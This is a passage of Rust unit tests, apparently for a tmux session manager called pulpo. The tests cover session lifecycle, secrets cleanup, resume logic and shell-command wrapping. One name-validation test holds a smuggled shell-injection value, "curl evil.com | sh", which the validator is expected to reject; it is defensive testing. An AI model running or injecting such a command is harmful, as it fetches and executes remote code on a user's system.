            Ok(*self.alive.lock().unwrap())
        }

        fn capture_output(&self, name: &str, lines: usize) -> Result<String> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("capture:{name}:{lines}"));
            Ok(self.captured_output.lock().unwrap().clone())
        }

        fn send_input(&self, name: &str, text: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("send_input:{name}:{text}"));
            Ok(())
        }

        fn setup_logging(&self, name: &str, log_path: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("setup_logging:{name}:{log_path}"));
            Ok(())
        }

        fn query_backend_id(&self, name: &str) -> anyhow::Result<String> {
            Ok(format!("${}", name.len()))
        }

        fn list_sessions(&self) -> anyhow::Result<Vec<(String, String)>> {
            Ok(Vec::new())
        }
    }

    struct FailCapture;
    impl Backend for FailCapture {
        fn create_session(&self, _: &str, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn kill_session(&self, _: &str) -> Result<()> {
            Ok(())
        }
        fn is_alive(&self, _: &str) -> Result<bool> {
            Ok(true)
        }
        fn capture_output(&self, _: &str, _: usize) -> Result<String> {
            Err(anyhow!("session not alive"))
        }
        fn send_input(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
        fn setup_logging(&self, _: &str, _: &str) -> Result<()> {
            Ok(())
        }
    }

    async fn test_manager(
        backend: MockBackend,
    ) -> (SessionManager, Arc<MockBackend>, sqlx::SqlitePool) {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let pool = store.pool().clone();
        let backend = Arc::new(backend);
        let manager = SessionManager::new(backend.clone(), store, None).with_no_stale_grace();
        (manager, backend, pool)
    }

    fn make_req(name: &str) -> CreateSessionRequest {
        CreateSessionRequest {
            name: name.to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hello".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        }
    }

    #[tokio::test]
    async fn test_create_session_defaults() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("fix-the-bug")).await.unwrap();

        assert_eq!(session.name, "fix-the-bug");
        assert_eq!(session.command, "echo hello");
        assert_eq!(session.status, SessionStatus::Active);
        assert_eq!(session.workdir, "/tmp");
        // MockBackend.query_backend_id() returns $N where N is the name length
        assert_eq!(session.backend_session_id, Some("$11".into()));

        let calls = backend.calls.lock().unwrap();
        // All commands wrapped in bash -l -c for session survival
        assert!(calls[0].contains("-l -c"));
        assert!(calls[0].contains("echo hello"));
        // Output capture is off by default, so no setup_logging call is made.
        assert!(!calls.iter().any(|c| c.starts_with("setup_logging:")));
        assert_eq!(calls.len(), 1);
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_no_command_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[test]
    fn test_validate_session_name_valid() {
        assert!(validate_session_name("my-session").is_ok());
        assert!(validate_session_name("a").is_ok());
        assert!(validate_session_name("fix-auth-123").is_ok());
        assert!(validate_session_name("nightly-20260331-0300").is_ok());
    }

    #[test]
    fn test_validate_session_name_rejects_shell_injection() {
        let result = validate_session_name("x'; curl evil.com | sh; echo '");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("lowercase"));
    }

    #[test]
    fn test_validate_session_name_rejects_special_chars() {
        assert!(validate_session_name("").is_err());
        assert!(validate_session_name("Has Spaces").is_err());
        assert!(validate_session_name("UPPERCASE").is_err());
        assert!(validate_session_name("has.dots").is_err());
        assert!(validate_session_name("has:colons").is_err());
        assert!(validate_session_name("-leading-hyphen").is_err());
        assert!(validate_session_name("trailing-hyphen-").is_err());
    }

    #[test]
    fn test_validate_session_name_rejects_long_names() {
        let long = "a".repeat(129);
        assert!(validate_session_name(&long).is_err());
        let ok = "a".repeat(128);
        assert!(validate_session_name(&ok).is_ok());
    }

    #[test]
    fn test_wrap_command_escapes_session_name() {
        // Even if validation is bypassed, wrap_command should escape the name
        let id = uuid::Uuid::new_v4();
        let wrapped = wrap_command("echo test", &id, "safe-name", None, None, "/tmp");
        assert!(wrapped.contains("PULPO_SESSION_NAME=safe-name"));
        // Verify single quotes in name would be escaped (defense-in-depth)
        let wrapped = wrap_command("echo test", &id, "name'inject", None, None, "/tmp");
        assert!(!wrapped.contains("name'inject"));
        assert!(wrapped.contains("name'\\''inject"));
    }

    #[tokio::test]
    async fn test_create_session_rejects_invalid_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad name with spaces".into(),
            workdir: Some("/tmp".into()),
            command: Some("echo".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let err = mgr.create_session(req).await.unwrap_err().to_string();
        assert!(err.contains("lowercase"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_default_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "defaults-test".into(),
            workdir: None,
            command: Some("echo test".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert!(!session.workdir.is_empty());
    }

    #[tokio::test]
    async fn test_create_session_calls_setup_logging_when_capture_enabled() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mgr = mgr.with_capture_session_output(true);
        let _session = mgr.create_session(make_req("test")).await.unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.starts_with("setup_logging:")),
            "Expected setup_logging call, got: {calls:?}"
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "custom-name".into(),
            ..make_req("test")
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.name, "custom-name");
    }

    #[tokio::test]
    async fn test_create_session_workdir_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap().to_owned();
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some(path),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_backend_failure() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_create_error()).await;
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());

        // Session should be marked Dead in store
        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        assert_eq!(sessions[0].status, SessionStatus::Stopped);
    }

    #[tokio::test]
    async fn test_create_session_backend_failure_cleans_up_secrets_file() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_create_error()).await;
        // Pre-populate a secret
        mgr.store()
            .set_secret("CLEANUP_TOKEN", "val123")
            .await
            .unwrap();
        let mut req = make_req("cleanup-test");
        req.secrets = Some(vec!["CLEANUP_TOKEN".into()]);
        let result = mgr.create_session(req).await;
        assert!(result.is_err());

        // The secrets file should have been cleaned up
        let data_dir = mgr.store().data_dir();
        let secrets_dir = format!("{data_dir}/secrets");
        if std::fs::exists(&secrets_dir).unwrap_or(false) {
            let entries: Vec<_> = std::fs::read_dir(&secrets_dir)
                .unwrap()
                .filter_map(std::result::Result::ok)
                .collect();
            assert!(
                entries.is_empty(),
                "secrets file should have been cleaned up, found: {entries:?}"
            );
        }
    }

    #[test]
    fn test_write_secrets_file_creates_secrets_subdirectory() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("KEY".to_owned(), "val".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        // File should be under data_dir/secrets/
        assert!(path.starts_with(&format!("{data_dir}/secrets/")));
        assert!(std::path::Path::new(&path).exists());
    }

    #[tokio::test]
    async fn test_create_session_duplicate_name_rejected() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("dupe")).await.unwrap();
        let err = mgr.create_session(make_req("dupe")).await.unwrap_err();
        assert!(
            err.to_string().contains("already active"),
            "expected duplicate name error, got: {err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_reuse_name_after_stop() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("reuse")).await.unwrap();
        mgr.stop_session("reuse", false).await.unwrap();
        // Should succeed — the old session is stopped
        mgr.create_session(make_req("reuse")).await.unwrap();
    }

    #[tokio::test]
    async fn test_get_session_alive() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_get_session_dead_lazy_update() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        // When fetched, check_and_mark_stale should detect dead backend and mark Lost
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_idle_with_alive_backend_stays_idle() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Idle);
    }

    // -- Ready-death classification (the #94 known limitation, fixed here) --
    //
    // Before this fix, `check_and_mark_stale` only swept Active/Idle sessions, so a
    // Ready session (agent exited, fallback shell lingering) whose tmux backend later
    // died was never reclassified — it stayed `Ready` forever (with the default
    // `ready_ttl_secs = 0`, nothing else would ever touch it). The fix runs Ready
    // sessions through the exact same marker-based resolution as Active/Idle.

    #[tokio::test]
    async fn test_get_session_ready_with_dead_backend_and_marker_transitions_to_stopped() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("ready-marker")).await.unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "9").unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert_eq!(fetched.exit_code, Some(9));
    }

    #[tokio::test]
    async fn test_get_session_ready_with_dead_backend_no_marker_transitions_to_lost() {
        // No wrapper ever ran for this session id (e.g. it reached Ready via the
        // text-scrape fallback used for adopted external tmux sessions), so no exit
        // marker exists. A dead backend with no marker resolves to Lost, same as the
        // Active/Idle case.
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("ready-no-marker"))
            .await
            .unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        assert_eq!(fetched.exit_code, None);
    }

    #[tokio::test]
    async fn test_get_session_ready_with_alive_backend_stays_ready() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = mgr.create_session(make_req("ready-alive")).await.unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Ready);
    }

    #[tokio::test]
    async fn test_list_sessions_ready_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("ready-list")).await.unwrap();
        let id = session.id.to_string();

        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        let listed = sessions.iter().find(|s| s.id.to_string() == id).unwrap();
        assert_eq!(listed.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resolves_dead_ready_with_marker_to_stopped_not_resumed() {
        // A Ready session must never be auto-"resumed" at startup (that would recreate
        // the backend and re-launch the original command, which makes no sense for a
        // session whose agent already finished) — it must resolve through the same
        // marker-based logic `resolve_dead_backend_session` applies elsewhere.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("ready-resume-marker"))
            .await
            .unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "3").unwrap();

        *backend.alive.lock().unwrap() = false;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0, "a Ready session must never be auto-resumed");

        // Assert against the raw store, not `mgr.get_session` — the latter would
        // mask a `resume_lost_sessions` gap by re-running its own lazy staleness
        // check. This proves `resume_lost_sessions` itself resolved the session
        // eagerly at startup, instead of leaving it stale as `Ready` in the DB
        // until the next `get_session`/`list_sessions` call happens to touch it.
        let fetched = mgr.store().get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
        assert_eq!(fetched.exit_code, Some(3));

        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resolves_dead_ready_without_marker_to_lost() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("ready-resume-no-marker"))
            .await
            .unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // Raw store fetch — see comment above on why `get_session` isn't used here.
        let fetched = mgr.store().get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);

        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_alive_ready_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(make_req("ready-resume-alive"))
            .await
            .unwrap();
        let id = session.id.to_string();
        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        // Backend still alive — resume_lost_sessions must leave it untouched.
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert_eq!(fetched.status, SessionStatus::Ready);
        drop(backend);
    }

    #[tokio::test]
    async fn test_list_sessions_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.get_session("nonexistent").await.unwrap();
        assert!(result.is_none());
    }

    #[tokio::test]
    async fn test_list_sessions_with_mixed_status() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let s1 = mgr.create_session(make_req("first")).await.unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        // is_alive returns false, so Running → Stale
        assert_eq!(sessions[0].id, s1.id);
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_stop_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
    }

    #[tokio::test]
    async fn test_stop_session_with_purge() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        mgr.stop_session(&id, true).await.unwrap();

        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", false).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("session not found")
        );
    }

    #[tokio::test]
    async fn test_stop_session_backend_error_recovers_by_name() {
        // Kill by stale $N ID fails, but retry by session name succeeds
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_kill_error()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let result = mgr.stop_session(&session.id.to_string(), false).await;
        assert!(result.is_ok(), "stop should succeed via name fallback");
    }

    #[tokio::test]
    async fn test_capture_output() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let output = mgr.capture_output("some-id", "my-session", 100);
        assert_eq!(output, "test output");
    }

    #[tokio::test]
    async fn test_capture_output_falls_back_to_log() {
        let backend = MockBackend::new();
        *backend.captured_output.lock().unwrap() = String::new();
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let data_dir = tmpdir.path().to_str().unwrap();
        let store = Store::new(data_dir).await.unwrap();
        store.migrate().await.unwrap();

        // Create a log file
        let log_dir = format!("{data_dir}/logs");
        std::fs::create_dir_all(&log_dir).unwrap();
        std::fs::write(
            format!("{log_dir}/test-id.log"),
            "line 1\nline 2\nline 3\nline 4\nline 5\n",
        )
        .unwrap();

        // Verify all FailCapture backend methods for coverage
        let fc = FailCapture;
        assert!(fc.create_session("n", "d", "c").is_ok());
        assert!(fc.kill_session("n").is_ok());
        assert!(fc.is_alive("n").unwrap());
        assert!(fc.capture_output("n", 10).is_err());
        assert!(fc.send_input("n", "t").is_ok());
        assert!(fc.setup_logging("n", "p").is_ok());

        let mgr = SessionManager::new(Arc::new(FailCapture), store, None);
        let output = mgr.capture_output("test-id", "whatever", 3);
        assert_eq!(output, "line 3\nline 4\nline 5");
    }

    #[tokio::test]
    async fn test_read_log_tail_missing_file() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(
            Arc::new(MockBackend::new()) as Arc<dyn Backend>,
            store,
            None,
        );
        // read_log_tail for nonexistent file returns empty string
        let output = mgr.read_log_tail("nonexistent", 10);
        assert!(output.is_empty());
    }

    #[tokio::test]
    async fn test_send_input() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.send_input("my-session", "hello").unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls
                .iter()
                .any(|c| c.contains("send_input:my-session:hello"))
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_store_insert_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        // Drop the table to make insert_session fail
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_list_sessions_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.list_sessions().await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_get_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.get_session("test").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_stop_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.stop_session("test", false).await;
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_workdir_ok() {
        assert!(validate_workdir("/tmp").is_ok());
    }

    #[test]
    fn test_validate_workdir_missing() {
        let err = validate_workdir("/nonexistent/path")
            .unwrap_err()
            .to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[test]
    fn test_validate_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap();
        let err = validate_workdir(path).unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_resume_stale_session() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);

        // Now resume it — backend session is still alive, so it should skip create_session
        *backend.alive.lock().unwrap() = true;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);

        // Verify create_session was NOT called (backend session already exists)
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            !calls.iter().any(|c| c.starts_with("create:")),
            "should not recreate backend session when alive; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_stale_session_recreates_when_backend_dead() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let _ = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();

        // Resume while backend session is dead — should recreate
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);

        // Verify create_session WAS called
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("create:")),
            "should recreate backend session when dead; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_non_stale_session_fails() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Session is Active, not Lost/Ready
        let result = mgr.resume_session(&session.id.to_string()).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("cannot be resumed")
        );
    }

    #[tokio::test]
    async fn test_resume_nonexistent_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.resume_session("nonexistent").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resume_name_collision_rejected() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        // Create "dup", then mark it lost so it's resumable
        let old = mgr.create_session(make_req("dup")).await.unwrap();
        let old_id = old.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&old_id)
            .execute(&pool)
            .await
            .unwrap();
        // Create a new active "dup"
        mgr.create_session(make_req("dup")).await.unwrap();
        // Resuming the old lost one should fail — name collision
        let err = mgr.resume_session(&old_id).await.unwrap_err();
        assert!(err.to_string().contains("already active"), "{err}");
    }

    #[tokio::test]
    async fn test_resume_backend_failure() {
        let backend = MockBackend::new().with_alive(false);
        let (mgr, backend_ref, _pool) = test_manager(backend).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let id = session.id.to_string();

        // Mark stale
        let _ = mgr.get_session(&id).await.unwrap();

        // Make create_session fail for resume
        *backend_ref.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
        let result = mgr.resume_session(&id).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_resume_ready_session_does_not_self_collide() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("ready-test")).await.unwrap();
        let id = session.id.to_string();

        // Mark session as Ready (simulates a session whose agent finished)
        sqlx::query("UPDATE sessions SET status = 'ready' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        // Resuming a Ready session should succeed — it must not collide with itself
        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);
    }

    #[test]
    fn test_wrap_command_basic() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo hello", &id, "test-session", None, None, "/tmp");
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("echo hello"));
        assert!(cmd.contains("[pulpo] Agent exited (session: test-session)"));
        assert!(cmd.contains("Run: pulpo resume test-session"));
        // Fallback shell uses $SHELL (or /bin/bash), run as a login shell — NOT exec'd,
        // so the wrapper regains control afterward to write the `.clean` marker.
        assert!(cmd.contains(" -l; : > "));
        assert!(!cmd.contains("exec "));
        // Exit-code marker: `$?` captured immediately, then written to `{id}.code`.
        assert!(cmd.contains("ec=$?"));
        assert!(cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=test-session"));
    }

    #[test]
    fn test_wrap_command_single_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "claude -p 'Fix the bug'",
            &id,
            "my-task",
            None,
            None,
            "/tmp",
        );
        assert!(cmd.contains("-l -c"));
        // Single quotes should be properly escaped
        assert!(cmd.contains("claude -p"));
        assert!(cmd.contains("Fix the bug"));
        assert!(cmd.contains("PULPO_SESSION_ID="));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-task"));
        assert!(cmd.contains("(session: my-task)"));
        assert!(cmd.contains("Run: pulpo resume my-task"));
    }

    #[test]
    fn test_wrap_command_quoting_is_valid_shell() {
        // Verify the wrapped command has balanced single quotes so it doesn't
        // cause "unmatched '" errors when tmux passes it to the shell.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("claude", &id, "test-session", None, None, "/tmp");

        // Count single quotes outside of escaped sequences (\')
        // The '\'' pattern (end-quote, escaped-quote, start-quote) is valid.
        // After removing all '\'' patterns, remaining quotes must be balanced.
        let simplified = cmd.replace("'\\''", "X");
        let quote_count = simplified.chars().filter(|&c| c == '\'').count();
        assert_eq!(
            quote_count % 2,
            0,
            "unbalanced single quotes in wrapped command: {cmd}"
        );
    }

    #[test]
    fn test_wrap_command_executes_without_parse_error() {
        // Run the entire wrapped command through `sh -n` (parse-only) to catch
        // quoting bugs. The wrapped command is a complete shell invocation like
        // `/bin/zsh -l -c '...'`, so we parse it as a whole.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("true", &id, "test-session", None, None, "/tmp");

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
